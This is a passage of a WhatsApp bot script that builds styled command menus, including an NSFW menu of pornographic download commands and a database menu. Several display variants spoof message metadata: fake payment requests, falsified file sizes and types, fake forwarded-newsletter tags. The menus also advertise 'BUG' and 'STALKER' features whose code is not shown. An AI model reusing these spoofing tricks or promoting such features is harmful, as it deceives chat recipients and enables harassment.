                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/rM74vTU.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/rM74vTU.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'nsfwmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Anime NSFW* 」❍
│${setv} ${prefix}*hentai√*
│${setv} ${prefix}*xnxxsearch√*
│${setv} ${prefix}*xvideosearch√*
│${setv} ${prefix}*xnxxdl√*
│${setv} ${prefix}*xvideodl√*
│${setv} ${prefix}*gifblowjob√*
│${setv} ${prefix}*hentaivid√*
│${setv} ${prefix}*hneko√*
│${setv} ${prefix}*nwaifu√*
│${setv} ${prefix}*animespank√*
│${setv} ${prefix}*trap√*
│${setv} ${prefix}*blowjob√*
│${setv} ${prefix}*cuckold√*
│${setv} ${prefix}*milf√*
│${setv} ${prefix}*eba√*
│${setv} ${prefix}*pussy√*
│${setv} ${prefix}*yuri√*
│${setv} ${prefix}*zettai√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/y0eUi6U.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/y0eUi6U.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'databasemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Database* 」❍
│${setv} ${prefix}*setcmd✓*
│${setv} ${prefix}*delcmd✓*
│${setv} ${prefix}*listcmd√*
│${setv} ${prefix}*lockcmd✓*
│${setv} ${prefix}*addmsg✓*
│${setv} ${prefix}*delmsg✓*
│${setv} ${prefix}*getmsg√*
│${setv} ${prefix}*listmsg√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/vWpXug6.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/vWpXug6.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
